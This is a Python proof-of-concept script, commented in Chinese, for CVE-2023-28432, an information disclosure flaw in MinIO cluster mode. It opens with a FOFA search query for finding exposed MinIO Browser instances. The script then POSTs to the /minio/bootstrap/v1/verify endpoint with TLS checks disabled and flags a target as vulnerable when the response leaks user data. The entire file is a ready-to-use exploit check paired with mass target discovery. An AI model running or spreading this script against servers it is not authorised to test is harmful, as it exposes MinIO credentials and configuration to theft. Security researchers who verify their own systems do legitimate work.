#FOFA语句：title="MinIO Browser"
#导包
import requests,sys,argparse,json,re
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
        _______      ________    ___   ___ ___  ____      ___   ___  _  _  ____ ___    __  __ _       _____ ____  _        __                           _   _               _            _                    
       / ____\ \    / /  ____|  |__ \ / _ \__ \|___ \    |__ \ / _ \| || ||___ \__ \  |  \/  (_)     |_   _/ __ \(_)      / _|                         | | (_)             | |          | |                   
      | |     \ \  / /| |__ ______ ) | | | | ) | __) |_____ ) | (_) | || |_ __) | ) | | \  / |_ _ __   | || |  | |_ _ __ | |_ ___  _ __ _ __ ___   __ _| |_ _  ___  _ __   | | ___  __ _| | ____ _  __ _  ___ 
      | |      \ \/ / |  __|______/ /| | | |/ / |__ <______/ / > _ <|__   _|__ < / /  | |\/| | | '_ \  | || |  | | | '_ \|  _/ _ \| '__| '_ ` _ \ / _` | __| |/ _ \| '_ \  | |/ _ \/ _` | |/ / _` |/ _` |/ _ \
      | |____   \  /  | |____    / /_| |_| / /_ ___) |    / /_| (_) |  | | ___) / /_  | |  | | | | | |_| || |__| | | | | | || (_) | |  | | | | | | (_| | |_| | (_) | | | | | |  __/ (_| |   < (_| | (_| |  __/
       \_____|   \/   |______|  |____|\___/____|____/    |____|\___/   |_||____/____| |_|  |_|_|_| |_|_____\____/|_|_| |_|_| \___/|_|  |_| |_| |_|\__,_|\__|_|\___/|_| |_| |_|\___|\__,_|_|\_\__,_|\__, |\___|
                                                                                                                                                                                                    __/ |     
                                                                                                                                                                                                   |___/      



"""
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description='CVE-2023-28432 MinIO集群模式信息泄露漏洞')
    parser.add_argument('-url','--url',dest='url',type=str,help='please input your url')
    args = parser.parse_args()
    if args.url:
        poc(args.url)
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


#poc函数
def poc(target):
    payload = '/minio/bootstrap/v1/verify'
    headers = { 'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Accept-Language': 'en-US;q=0.9,en;q=0.8',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36',
                'Connection': 'close',
                'Cache-Control': 'max-age=0',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': '0',
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080',
    }
    
    try:    
        res = requests.post(url=target + payload,headers=headers,verify=False,proxies=proxies)
    # print(res.status_code)
    # print(res.text)
        if res.status_code == 200 and 'User' in res.text:
            print(f'[+]{target}存在漏洞')
        else:
            print(f'[-]{target}不存在漏洞')
    except:
        pass




#函数入口
if __name__== '__main__':
    main()
